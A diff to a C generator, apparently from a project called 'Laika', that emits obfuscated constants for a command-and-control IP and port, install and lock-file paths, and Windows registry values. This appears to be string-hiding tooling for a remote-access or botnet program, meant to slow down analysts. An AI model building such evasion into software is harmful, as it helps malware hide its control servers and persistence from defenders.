@@ -1,12 +1,10 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <time.h>
 #include <inttypes.h>
 
-#include "lmem.h"
-#include "lvm.h"
-#include "lbox.h"
-#include "lsodium.h"
+#include "lconfig.h"
 
 #define ERR(...) do { printf(__VA_ARGS__); exit(EXIT_FAILURE); } while(0);
 #define RANDBYTE (rand() % UINT8_MAX)
@@ -73,6 +71,9 @@ int main(int argv, char **argc) {
     srand(time(NULL)); /* really doesn't need to be cryptographically secure, the point is only to slow them down */
 
     fprintf(out, PREAMBLE);
+    /* shared */
+    MAKESKIDDATA(LAIKA_CNC_IP);
+    MAKESKIDDATA(LAIKA_CNC_PORT);
     /* linux */
     MAKESKIDDATA(LAIKA_LIN_LOCK_FILE);
     MAKESKIDDATA(LAIKA_LIN_INSTALL_DIR);
@@ -86,6 +87,8 @@ int main(int argv, char **argc) {
     MAKESKIDDATA(LAIKA_WIN_REG_VAL);
     fprintf(out, POSTAMBLE);
     fclose(out);
+
+    printf("Wrote %s\n", argc[1]);
     return 0;
 }
 
